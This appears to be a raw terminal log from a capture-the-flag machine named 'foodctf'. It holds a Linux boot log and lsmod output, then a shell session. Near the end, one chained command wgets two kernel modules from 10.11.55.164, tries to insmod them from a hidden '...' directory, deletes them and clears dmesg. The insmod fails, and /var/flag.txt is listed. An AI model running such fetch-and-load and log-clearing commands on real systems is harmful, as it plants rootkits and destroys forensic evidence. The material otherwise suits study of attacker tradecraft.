[    2.426717] x86/mm: Checking user space page tables
[    2.436754] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    2.463810] random: systemd-udevd: uninitialized urandom read (16 bytes read)
[    2.474558] random: udevadm: uninitialized urandom read (16 bytes read)
[    2.483545] random: systemd-udevd: uninitialized urandom read (16 bytes read)
[    2.656042] tsc: Refined TSC clocksource calibration: 2300.025 MHz
[    2.661332] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x21274d0437c, max_idle_ns: 440795302444 ns
[    2.675444] FDC 0 is a S82078B
[    2.831462] checking generic (f0000000 160000) vs hw (f0000000 2000000)
[    2.831463] fb: switching to cirrusdrmfb from EFI VGA
[    2.845470] AVX2 version of gcm_enc/dec engaged.
[    2.848855] AES CTR mode by8 optimization enabled
[    2.866839] Console: switching to colour dummy device 80x25
[    2.900478] [TTM] Zone  kernel: Available graphics memory: 503412 kiB
[    2.913109] [TTM] Initializing pool allocator
[    2.918419] [TTM] Initializing DMA pool allocator
[    2.925916] [drm] fb mappable at 0xF0000000
[    2.931828] [drm] vram aper at 0xF0000000
[    2.937771] [drm] size 33554432
[    2.942019] [drm] fb depth is 24
[    2.946375] [drm]    pitch is 3072
[    2.951292] fbcon: cirrusdrmfb (fb0) is primary device
[    3.013412] Console: switching to colour frame buffer device 128x48
[    3.032068] cirrus 0000:00:02.0: fb0: cirrusdrmfb frame buffer device
[    3.039164] [drm] Initialized cirrus 1.0.0 20110418 for 0000:00:02.0 on minor 0
[    3.047901] piix4_smbus 0000:00:01.3: SMBus base address uninitialized - upgrade BIOS or use force_addr=0xaddr
[    3.268015] raid6: sse2x1   gen()  5852 MB/s
[    3.323145] raid6: sse2x1   xor()  5021 MB/s
[    3.383252] raid6: sse2x2   gen()  8887 MB/s
[    3.432013] raid6: sse2x2   xor()  5586 MB/s
[    3.480059] raid6: sse2x4   gen()  8241 MB/s
[    3.528064] raid6: sse2x4   xor()  6600 MB/s
[    3.576023] raid6: avx2x1   gen() 11304 MB/s
[    3.624030] raid6: avx2x1   xor()  9634 MB/s
[    3.672013] raid6: avx2x2   gen() 13403 MB/s
[    3.724051] raid6: avx2x2   xor()  9898 MB/s
[    3.780169] raid6: avx2x4   gen() 17487 MB/s
[    3.832010] raid6: avx2x4   xor() 11947 MB/s
[    3.835297] raid6: using algorithm avx2x4 gen() 17487 MB/s
[    3.840063] raid6: .... xor() 11947 MB/s, rmw enabled
[    3.848186] raid6: using avx2x2 recovery algorithm
[    3.854477] xor: automatically using best checksumming function   avx       
[    3.863374] async_tx: api initialized (async)
[    3.940742] Btrfs loaded, crc32c=crc32c-intel
[    4.000335] EXT4-fs (xvda2): mounted filesystem with ordered data mode. Opts: (null)
[    4.262336] ip_tables: (C) 2000-2006 Netfilter Core Team
[    4.275730] systemd[1]: systemd 237 running in system mode. (+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD -IDN2 +IDN -PCRE2 default-hierarchy=hybrid)
[    4.295857] systemd[1]: Detected virtualization xen.
[    4.300149] systemd[1]: Detected architecture x86-64.
[    4.313894] systemd[1]: Set hostname to <foodctf>.
[    4.513732] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input4
[    4.590139] systemd[1]: Created slice User and Session Slice.
[    4.602074] systemd[1]: Reached target Swap.
[    4.609949] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
[    4.621299] systemd[1]: Reached target User and Group Name Lookups.
[    4.630935] systemd[1]: Set up automount Arbitrary Executable File Formats File System Automount Point.
[    4.645702] systemd[1]: Created slice System Slice.
[    4.716040] EXT4-fs (xvda2): re-mounted. Opts: (null)
[    4.878415] Loading iSCSI transport class v2.0-870.
[    4.918480] iscsi: registered transport (tcp)
[    5.031984] iscsi: registered transport (iser)
[    5.251997] systemd-journald[397]: Received request to flush runtime journal from PID 1
[    5.645259] audit: type=1400 audit(1702074699.788:2): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default" pid=491 comm="apparmor_parser"
[    5.645262] audit: type=1400 audit(1702074699.788:3): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default-cgns" pid=491 comm="apparmor_parser"
[    5.645263] audit: type=1400 audit(1702074699.788:4): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default-with-mounting" pid=491 comm="apparmor_parser"
[    5.645265] audit: type=1400 audit(1702074699.788:5): apparmor="STATUS" operation="profile_load" profile="unconfined" name="lxc-container-default-with-nesting" pid=491 comm="apparmor_parser"
[    5.677599] audit: type=1400 audit(1702074699.820:6): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/sbin/dhclient" pid=494 comm="apparmor_parser"
[    5.677602] audit: type=1400 audit(1702074699.820:7): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/lib/NetworkManager/nm-dhcp-client.action" pid=494 comm="apparmor_parser"
[    5.677604] audit: type=1400 audit(1702074699.820:8): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/lib/NetworkManager/nm-dhcp-helper" pid=494 comm="apparmor_parser"
[    5.677605] audit: type=1400 audit(1702074699.820:9): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/lib/connman/scripts/dhclient-script" pid=494 comm="apparmor_parser"
[    5.687048] audit: type=1400 audit(1702074699.828:10): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/bin/lxc-start" pid=496 comm="apparmor_parser"
[    5.696891] audit: type=1400 audit(1702074699.840:11): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/usr/bin/man" pid=497 comm="apparmor_parser"
[    6.561948] RAPL PMU: API unit is 2^-32 Joules, 3 fixed counters, 655360 ms ovfl timer
[    6.561949] RAPL PMU: hw unit of domain pp0-core 2^-14 Joules
[    6.561950] RAPL PMU: hw unit of domain package 2^-14 Joules
[    6.561950] RAPL PMU: hw unit of domain dram 2^-16 Joules
[    6.599251] EDAC sbridge: Seeking for: PCI ID 8086:6fa0
[    6.599255] EDAC sbridge:  Ver: 1.1.2 
[   20.098694] new mount options do not match the existing superblock, will be ignored
[   23.305090] random: crng init done
[   23.305092] random: 7 urandom warning(s) missed due to ratelimiting
lsmod
Module                  Size  Used by
binfmt_misc            20480  1
sb_edac                24576  0
intel_rapl_perf        16384  0
input_leds             16384  0
serio_raw              16384  0
mac_hid                16384  0
sch_fq_codel           20480  2
ib_iser                49152  0
rdma_cm                61440  1 ib_iser
iw_cm                  45056  1 rdma_cm
ib_cm                  53248  1 rdma_cm
ib_core               221184  4 rdma_cm,iw_cm,ib_iser,ib_cm
iscsi_tcp              20480  0
libiscsi_tcp           20480  1 iscsi_tcp
libiscsi               53248  3 libiscsi_tcp,iscsi_tcp,ib_iser
scsi_transport_iscsi    98304  3 iscsi_tcp,ib_iser,libiscsi
ip_tables              28672  0
x_tables               40960  1 ip_tables
autofs4                40960  2
btrfs                1138688  0
zstd_compress         163840  1 btrfs
raid10                 53248  0
raid456               147456  0
async_raid6_recov      20480  1 raid456
async_memcpy           16384  2 raid456,async_raid6_recov
async_pq               16384  2 raid456,async_raid6_recov
async_xor              16384  3 async_pq,raid456,async_raid6_recov
async_tx               16384  5 async_pq,async_memcpy,async_xor,raid456,async_raid6_recov
xor                    24576  2 async_xor,btrfs
raid6_pq              114688  4 async_pq,btrfs,raid456,async_raid6_recov
libcrc32c              16384  1 raid456
raid1                  40960  0
raid0                  20480  0
multipath              16384  0
linear                 16384  0
crct10dif_pclmul       16384  0
crc32_pclmul           16384  0
ghash_clmulni_intel    16384  0
pcbc                   16384  0
i2c_piix4              24576  0
cirrus                 24576  1
aesni_intel           188416  0
aes_x86_64             20480  1 aesni_intel
crypto_simd            16384  1 aesni_intel
ttm                   106496  1 cirrus
glue_helper            16384  1 aesni_intel
cryptd                 24576  3 crypto_simd,ghash_clmulni_intel,aesni_intel
drm_kms_helper        172032  1 cirrus
syscopyarea            16384  1 drm_kms_helper
sysfillrect            16384  1 drm_kms_helper
sysimgblt              16384  1 drm_kms_helper
psmouse               151552  0
fb_sys_fops            16384  1 drm_kms_helper
drm                   401408  4 drm_kms_helper,cirrus,ttm
pata_acpi              16384  0
floppy                 77824  0
hey there buddy :)
cd /var && mkdir ... && cd ... && wget 10.11.55.164/food.ko && wget 10.11.55.164/foodmount.ko && insmod food.ko && insmod foodmount.ko && rm * && dmesg --clear
--2023-12-08 23:01:42--  http://10.11.55.164/food.ko
Connecting to 10.11.55.164:80... 
connected.
HTTP request sent, awaiting response... 200 OK
Length: 7240 (7.1K) [application/octet-stream]
Saving to: 'food.ko'

     0K .......                                               100%  102M=0s

2023-12-08 23:01:43 (102 MB/s) - 'food.ko' saved [7240/7240]

--2023-12-08 23:01:43--  http://10.11.55.164/foodmount.ko
Connecting to 10.11.55.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5944 (5.8K) [application/octet-stream]
Saving to: 'foodmount.ko'

     0K .....                                                 100% 3.52M=0.002s

2023-12-08 23:01:43 (3.52 MB/s) - 'foodmount.ko' saved [5944/5944]

insmod: ERROR: could not insert module food.ko: Operation not permitted

ls -la
total 24
drwxr-xr-x  2 root root 4096 Dec  8 23:01 .
drwxr-xr-x 14 root root 4096 Dec  8 23:01 ..
-rw-r--r--  1 root root 7240 Jun 12 15:25 food.ko
-rw-r--r--  1 root root 5944 Jun 12 15:57 foodmount.ko
cd ..
rm -rf ...
w
 23:01:47 up 30 min,  0 users,  load average: 0.36, 0.94, 1.47
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
pwd
/var
ls -la
total 56
drwxr-xr-x 13 root root   4096 Dec  8 23:01 .
drwxr-xr-x 24 root root   4096 Mar 19  2020 ..
drwxr-xr-x  2 root root   4096 Mar 20  2020 backups
drwxr-xr-x 10 root root   4096 Mar 19  2020 cache
drwxrwxrwt  2 root root   4096 Aug  5  2019 crash
-rw-r--r--  1 root root     38 Mar 28  2020 flag.txt
drwxr-xr-x 41 root root   4096 Mar 20  2020 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Aug  5  2019 lock -> /run/lock
drwxrwxr-x 10 root syslog 4096 Mar 30  2020 log
drwxrwsr-x  2 root mail   4096 Aug  5  2019 mail
drwxr-xr-x  2 root root   4096 Aug  5  2019 opt
lrwxrwxrwx  1 root root      4 Aug  5  2019 run -> /run
